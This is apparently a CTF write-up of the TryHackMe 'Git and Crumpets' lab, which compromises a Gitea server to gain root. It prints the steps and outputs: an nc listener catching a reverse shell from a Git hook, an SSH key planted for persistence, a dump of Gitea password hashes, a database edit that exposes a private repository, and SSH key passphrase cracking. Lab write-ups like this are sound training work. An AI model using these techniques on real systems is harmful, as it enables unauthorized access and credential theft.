# Git and Crumpets

## Introduction

Welcome to my another writeup! In this TryHackMe [Git and Crumpets](https://tryhackme.com/room/gitandcrumpets) room, you'll learn: Exploiting Gitea and more! Without further ado, let's dive in.

## Background

> Our devs have been clamoring for some centralized version control, so the admin came through. Rumour has it that they included a few countermeasures...

- Overall difficulty for me: Medium
   - Initial foothold: Easy
   - Privilege escalation: Medium

## Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Git-and-Crumpets]
└─# export RHOSTS=10.10.198.79
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/Git-and-Crumpets]
└─# rustscan --ulimit 5000 -t 2000 --range=1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.0 (protocol 2.0)
80/tcp open  http    syn-ack ttl 63 nginx
| http-title: Hello, World
|_Requested resource was http://10.10.198.79/index.html
|_http-trane-info: Problem with XML parsing of /evox/about
| http-methods: 
|_  Supported Methods: GET
```

According to `rustscan` result, we have 2 ports are opened:

Open Ports        | Service
------------------|------------------------
22                | OpenSSH 8.0
80                | nginx

### HTTP on Port 80

**In the index page, we can see some interesting things:**
```html
┌──(root🌸siunam)-[~/ctf/thm/ctf/Git-and-Crumpets]
└─# curl http://$RHOSTS/
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Go away!</title>
  </head>
  <body>
    <main>
      <h1>Nothing to see here, move along</h1>
      <h2>Notice:</h2>
      <p> 
        Hey guys,
           I set up the dev repos at git.git-and-crumpets.thm, but I haven't gotten around to setting up the DNS yet. 
           In the meantime, here's a fun video I found!
        Hydra
      </p>
[...]
Never gonna give you up,
            Never gonna let you down...
      </pre>
    </main>
  </body>
</html>
```

```
Hey guys,
    I set up the dev repos at git.git-and-crumpets.thm, but I haven't gotten around to setting up the DNS yet. 
	In the meantime, here's a fun video I found!
Hydra
```

**Let's add that domain to `/etc/hosts`!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Git-and-Crumpets]
└─# echo "$RHOSTS git.git-and-crumpets.thm" | tee -a /etc/hosts
```

**Go to that domain:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Git-and-Crumpets/images/a1.png)

It's a `Gitea` page!

**Let's view their public repository**!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Git-and-Crumpets/images/a2.png)

Hmm... Looks like **we have to login first**.

Well then, let's **register a new account**:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Git-and-Crumpets/images/a3.png)

In `/explore/users`, we can see that there are **4 users**: `hydra`, `root`, `scones`, `test`.

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Git-and-Crumpets/images/a4.png)

In `/explore/repos`, there are **2 public repositories**: `cant-touch-this` and `hello-world`.

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Git-and-Crumpets/images/a5.png)

**`hello-world` repository:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Git-and-Crumpets/images/a6.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Git-and-Crumpets/images/a7.png)

Nothing weird in here.

**`cant-touch-this` repository:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Git-and-Crumpets/images/a8.png)

There are **5 commits**! Let's take a look at those commits:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Git-and-Crumpets/images/a9.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Git-and-Crumpets/images/a10.png)

In the `Delete Passwords File` commit, there is a message says:

```
I kept the password in my avatar to be more secure.
```

Let's go to that his avatar!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Git-and-Crumpets/images/a11.png)

Maybe the `I like scones.` is the password?

Let's `Sign Out` and try to login as user `scones`.

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Git-and-Crumpets/images/a12.png)

After I tried to guess user `scones` a few times, looks like there is a **bruteforce protection** is being implemented. 

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Git-and-Crumpets/images/a13.png)

## Initial Foothold

And then I realized, it says the **avatar**, not the description lul.

**Then, I downloaded the his avatar, and use `exiftool` to view metadata inside that picture:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Git-and-Crumpets/images/a14.png)

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Git-and-Crumpets]
└─# wget http://git.git-and-crumpets.thm/avatars/3fc2cde6ac97e8c8a0c8b202e527d56d.png
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Git-and-Crumpets]
└─# exiftool 3fc2cde6ac97e8c8a0c8b202e527d56d.png 
[...]
Description                     : My '{Redacted}' should be easy enough to guess
[...]
```

Found the password! Let's login as user `scones`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Git-and-Crumpets/images/a15.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Git-and-Crumpets/images/a16.png)

I'm user `scones` now!

**Now, let's enumerate `scones`'s `cant-touch-this` repository:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Git-and-Crumpets/images/a17.png)

We can see that **we can push a new commit**.

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Git-and-Crumpets/images/a18.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Git-and-Crumpets/images/a19.png)

And we're **able to add a new Git Hook**!!

**If we're able to do those things, we can get a reverse shell!**

**To do so, I'll:**

- Add a reverse shell in the `update` Git Hook:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Git-and-Crumpets/images/a20.png)

- Setup a `nc` listener:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Git-and-Crumpets]
└─# nc -lnvp 443   
listening on [any] 443 ...
```

- Push a new commit: 

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Git-and-Crumpets/images/a21.png)

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Git-and-Crumpets]
└─# nc -lnvp 443   
listening on [any] 443 ...
connect to [10.8.27.249] from (UNKNOWN) [10.10.78.235] 56910
bash: cannot set terminal process group (843): Inappropriate ioctl for device
bash: no job control in this shell
[git@git-and-crumpets cant-touch-this.git]$ whoami;hostname;id;ip a
whoami;hostname;id;ip a
git
git-and-crumpets
uid=993(git) gid=990(git) groups=990(git) context=system_u:system_r:unconfined_service_t:s0
[...]
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:ba:d6:6a:ec:23 brd ff:ff:ff:ff:ff:ff
    inet 10.10.78.235/16 brd 10.10.255.255 scope global dynamic noprefixroute eth0
       valid_lft 2284sec preferred_lft 2284sec
    inet6 fe80::ba:d6ff:fe6a:ec23/64 scope link 
       valid_lft forever preferred_lft forever
[git@git-and-crumpets cant-touch-this.git]$ 
```

I'm user `git`!

**Stable shell via SSH key:**

Since the target machine has SSH running, we can **add our public SSH key into `/home/git/.ssh/authorized_keys`**:

- Generate private and public SSH key:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Git-and-Crumpets]
└─# mkdir .ssh;cd .ssh
                                                                                                           
┌──(root🌸siunam)-[~/…/thm/ctf/Git-and-Crumpets/.ssh]
└─# ssh-keygen      
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): /root/ctf/thm/ctf/Git-and-Crumpets/.ssh/id_rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
[...]
```

- Copy the public key and paste to `/home/git/.ssh/authorized_keys`:

```
┌──(root🌸siunam)-[~/…/thm/ctf/Git-and-Crumpets/.ssh]
└─# cat id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCvgDfKfGCMlrhV8vgde6Sz9w4CztZ6fjfMLbXb1/Qlckm/vGSjkYB4pT7Qb//UBz0YwL1jKLYzvkGXwZ1FE08jAzqPvbmZ1VsLK5wX9Ar9o5O/9k6pofhVxGjAA8shwG1u3lsWtIEx775pTvcAUA6AgjyPbUXw2Gkba9gyOYxRCJ11ZjaajufVkd2aQPFLw9zUzTTQpR/69QlurckCupUlLV7ylLi289oUpN4xZcIF0r/vx0C8a77BVRHRU9obBq42v9IN8SfZUEqRe4yuvCsybYVvKCu9vec3tgWHq82ZxjbEl8pxAsw9MYQnhz908Xg/osPdloYx4uXri1Z0QHwaEljwzcLVU0osJeqyqf7yQPOPUdb94B1ENLMR17VptQ17E5XW15y1nq8UXNsDtvm3E7DgFH6LY/jUePKBxlG7NvzHsEK/B5iPkc31WNw9TIhTU0FcL261bLlZ6W5oKXU+dKPm9zTeTAVb4SOsQF6K2PRNJ0F+DKnyMlXTAHSLD1U= root@siunam

[git@git-and-crumpets ~]$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCvgDfKfGCMlrhV8vgde6Sz9w4CztZ6fjfMLbXb1/Qlckm/vGSjkYB4pT7Qb//UBz0YwL1jKLYzvkGXwZ1FE08jAzqPvbmZ1VsLK5wX9Ar9o5O/9k6pofhVxGjAA8shwG1u3lsWtIEx775pTvcAUA6AgjyPbUXw2Gkba9gyOYxRCJ11ZjaajufVkd2aQPFLw9zUzTTQpR/69QlurckCupUlLV7ylLi289oUpN4xZcIF0r/vx0C8a77BVRHRU9obBq42v9IN8SfZUEqRe4yuvCsybYVvKCu9vec3tgWHq82ZxjbEl8pxAsw9MYQnhz908Xg/osPdloYx4uXri1Z0QHwaEljwzcLVU0osJeqyqf7yQPOPUdb94B1ENLMR17VptQ17E5XW15y1nq8UXNsDtvm3E7DgFH6LY/jUePKBxlG7NvzHsEK/B5iPkc31WNw9TIhTU0FcL261bLlZ6W5oKXU+dKPm9zTeTAVb4SOsQF6K2PRNJ0F+DKnyMlXTAHSLD1U= root@siunam" >> /home/git/.ssh/authorized_keys
```

- SSH into user `git` with the private key:

```
┌──(root🌸siunam)-[~/…/thm/ctf/Git-and-Crumpets/.ssh]
└─# ssh -i id_rsa git@$RHOSTS              
[...]
[git@git-and-crumpets ~]$ whoami;id
git
uid=993(git) gid=990(git) groups=990(git) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[git@git-and-crumpets ~]$ 
```

**user.txt:**
```
[git@git-and-crumpets cant-touch-this.git]$ cat /home/git/user.txt | base64 -d
thm{Redacted}
```

## Privilege Escalation

### git to root

**In `/var/lib/gitea/data/gitea-repositories/root`, there is a repository called `backup` who owned by user `root` in Gitea:**
```
[git@git-and-crumpets root]$ ls -lah
[...]
drwxr-xr-x. 7 git git 119 Apr 15  2021 backup.git

[git@git-and-crumpets root]$ ls -lah backup.git/
total 16K
drwxr-xr-x.  7 git git  119 Apr 15  2021 .
drwxr-xr-x.  3 git git   24 Apr 15  2021 ..
drwxr-xr-x.  2 git git    6 Apr 15  2021 branches
-rw-r--r--.  1 git git   66 Apr 15  2021 config
-rw-r--r--.  1 git git   73 Apr 15  2021 description
-rw-r--r--.  1 git git   23 Apr 15  2021 HEAD
drwxr-xr-x.  5 git git 4.0K Apr 15  2021 hooks
drwxr-xr-x.  2 git git   33 Apr 15  2021 info
drwxr-xr-x. 14 git git  130 Apr 15  2021 objects
drwxr-xr-x.  4 git git   31 Apr 15  2021 refs
```

**Let's `clone` the repository:**
```
[git@git-and-crumpets root]$ git clone backup.git
Cloning into 'backup'...
done.

[git@git-and-crumpets root]$ ls -lah backup
[...]
drwxrwxr-x. 8 git git 163 Oct  9 10:33 .git
-rw-rw-r--. 1 git git  10 Oct  9 10:33 README.md

[git@git-and-crumpets root]$ cd backup

[git@git-and-crumpets backup]$ git checkout master
Already on 'master'
Your branch is up to date with 'origin/master'.
```

Oh, I can clone it!

Next, we can enumerate this repository! Such as `git log`.

```
[git@git-and-crumpets backup]$ git log
commit 24dfc45079d019f6ea51843b8892b325221a951e (HEAD -> master, origin/master, origin/HEAD)
Author: groot <root@example.com>
Date:   Thu Apr 15 15:25:01 2021 +0200

    Initial commit
```

Hmm... Nothing. Let's go back.

**In `/var/lib/gitea/data`, there is a SQLite database file, which stores all the data in Gitea:**
```
[git@git-and-crumpets data]$ ls -lah
[...]
-rw-r--r--.  1 git git 1.3M Oct  9 09:52 gitea.db
[...]

[git@git-and-crumpets data]$ file gitea.db 
gitea.db: SQLite 3.x database, last written using SQLite version 3034000
```

**Let's open this file in `sqlite3`!**
```
[git@git-and-crumpets data]$ sqlite3 gitea.db 
[...]
sqlite> .tables
access                     org_user                 
access_token               project                  
action                     project_board            
attachment                 project_issue            
collaboration              protected_branch         
comment                    public_key               
commit_status              pull_request             
deleted_branch             reaction                 
deploy_key                 release                  
email_address              repo_indexer_status      
email_hash                 repo_redirect            
external_login_user        repo_topic               
follow                     repo_transfer            
gpg_key                    repo_unit                
gpg_key_import             repository               
hook_task                  review                   
issue                      session                  
issue_assignees            star                     
issue_dependency           stopwatch                
issue_label                task                     
issue_user                 team                     
issue_watch                team_repo                
label                      team_unit                
language_stat              team_user                
lfs_lock                   topic                    
lfs_meta_object            tracked_time             
login_source               two_factor               
milestone                  u2f_registration         
mirror                     upload                   
notice                     user                     
notification               user_open_id             
oauth2_application         user_redirect            
oauth2_authorization_code  version                  
oauth2_grant               watch                    
oauth2_session             webhook     
```

**The `user` table looks interesting.**
```
sqlite> PRAGMA table_info(user);
0|id|INTEGER|1||1
1|lower_name|TEXT|1||0
2|name|TEXT|1||0
3|full_name|TEXT|0||0
4|email|TEXT|1||0
5|keep_email_private|INTEGER|0||0
6|email_notifications_preference|TEXT|1|'enabled'|0
7|passwd|TEXT|1||0
8|passwd_hash_algo|TEXT|1|'argon2'|0
9|must_change_password|INTEGER|1|0|0
10|login_type|INTEGER|0||0
11|login_source|INTEGER|1|0|0
12|login_name|TEXT|0||0
[...]
```

Let's **extract it's data**!

```sql
sqlite> SELECT name, passwd FROM user;
hydra|9b020d3e158bc31b5fe64d668d94cab38cadc6721a5fdf7a4b1fb7bf97021c5e68f56bd9bd44d5ce9547e5e234086342c4e4
root|2181d2b5fbf1859db426bcb94d97851d9a0e87a5eb47c5edc7f92bffc45b679e554c8367084f379e59936b68c0d770823ec9
scones|8d0386b217e0f1ad5a1012d879ce93c9d77fd79d888410fdee9e76ec58d6fa017042906dd9a2ea498d3fd5a7486a73875660
test|d3463d9c205751364af7850bca7956d0f5cc0eb125a097db54fd0087eec31cec1912245e57fdfc53423a89e6684a15f8939a
siunam|15a4e95574352aa1c1fd9e68b3d83c23dbfb7b15e7a22644fc72dacfca5ea54f7eb400b4675a2d05fb0a6adb278339258a8e
```

I tried to crack them, but no dice. Let's take a step back.

Since we know `root` has a `backup` repository, we can **look at the configuration for that repository**!

```
sqlite> PRAGMA table_info(repository);
0|id|INTEGER|1||1
1|owner_id|INTEGER|0||0
2|owner_name|TEXT|0||0
3|lower_name|TEXT|1||0
4|name|TEXT|1||0
5|description|TEXT|0||0
6|website|TEXT|0||0
7|original_service_type|INTEGER|0||0
8|original_url|TEXT|0||0
9|default_branch|TEXT|0||0
10|num_watches|INTEGER|0||0
11|num_stars|INTEGER|0||0
12|num_forks|INTEGER|0||0
13|num_issues|INTEGER|0||0
14|num_closed_issues|INTEGER|0||0
15|num_pulls|INTEGER|0||0
16|num_closed_pulls|INTEGER|0||0
17|num_milestones|INTEGER|1|0|0
18|num_closed_milestones|INTEGER|1|0|0
19|num_projects|INTEGER|1|0|0
20|num_closed_projects|INTEGER|1|0|0
21|is_private|INTEGER|0||0
22|is_empty|INTEGER|0||0
23|is_archived|INTEGER|0||0
24|is_mirror|INTEGER|0||0
25|status|INTEGER|1|0|0
26|is_fork|INTEGER|1|0|0
27|fork_id|INTEGER|0||0
28|is_template|INTEGER|1|0|0
29|template_id|INTEGER|0||0
30|size|INTEGER|1|0|0
31|is_fsck_enabled|INTEGER|1|1|0
32|close_issues_via_commit_in_any_branch|INTEGER|1|0|0
33|topics|TEXT|0||0
34|trust_model|INTEGER|0||0
35|avatar|TEXT|0||0
36|created_unix|INTEGER|0||0
37|updated_unix|INTEGER|0||0
```

In the table `repository`, we can see that **the `backup` repository is private (`1`)**!

```sql
sqlite> SELECT name, is_private FROM repository;
backup|1
cant-touch-this|0
hello-world|0
```

**Let's change that to `0` to make that repository readable for everyone!!**
```sql
sqlite> UPDATE repository SET is_private=0 WHERE name='backup';

sqlite> SELECT name, is_private FROM repository;
backup|0
cant-touch-this|0
hello-world|0
```

**Now, the `backup` repository is readable by everyone!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Git-and-Crumpets/images/a22.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Git-and-Crumpets/images/a23.png)

It might seem empty, but:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Git-and-Crumpets/images/a24.png)

**It has another branch called `dotfiles`!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Git-and-Crumpets/images/a25.png)

**And there are 4 commits!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Git-and-Crumpets/images/a26.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Git-and-Crumpets/images/a27.png)

This looks like a **private SSH key**! Let's copy and paste it to our attacker machine!

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Git-and-Crumpets]
└─# nano root_id_rsa
                                                                                                       
┌──(root🌸siunam)-[~/ctf/thm/ctf/Git-and-Crumpets]
└─# chmod 600 root_id_rsa
```

**Let's SSH into root!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Git-and-Crumpets]
└─# ssh -i root_id_rsa root@$RHOSTS        
Enter passphrase for key 'root_id_rsa':
```

Ahh... It needs a **passphrase**.

**We can crack it via `ssh2john` and `john`!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Git-and-Crumpets]
└─# ssh2john root_id_rsa > root_id_rsa.hash
                                                                                                       
┌──(root🌸siunam)-[~/ctf/thm/ctf/Git-and-Crumpets]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt root_id_rsa.hash
[...]
```

Hmm... Couldn't crack it with the `rockyou` wordlist...

After fumbling around, I found that **the passphrase is the filename in the commit**! Let's try that:

- Passphrase: `Sup3rS3cur3`

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Git-and-Crumpets]
└─# ssh -i root_id_rsa root@$RHOSTS
Enter passphrase for key 'root_id_rsa': 
[...]
[root@git-and-crumpets ~]# whoami;hostname;id;ip a
root
git-and-crumpets
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[...]
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:ba:d6:6a:ec:23 brd ff:ff:ff:ff:ff:ff
    inet 10.10.78.235/16 brd 10.10.255.255 scope global dynamic noprefixroute eth0
       valid_lft 2342sec preferred_lft 2342sec
    inet6 fe80::ba:d6ff:fe6a:ec23/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm root! :D

## Rooted

**root.txt:**
```
[root@git-and-crumpets ~]# cat /root/root.txt | base64 -d
thm{Redacted}
```

# Conclusion

What we've learned:

1. Gitea Enumeration
2. Bruteforce Protection
3. Reverse Shell via Git Hooks With a Compromised Gitea Account
4. Gitea Post Exploitation
5. Cracking SSH Private Key's Passphrase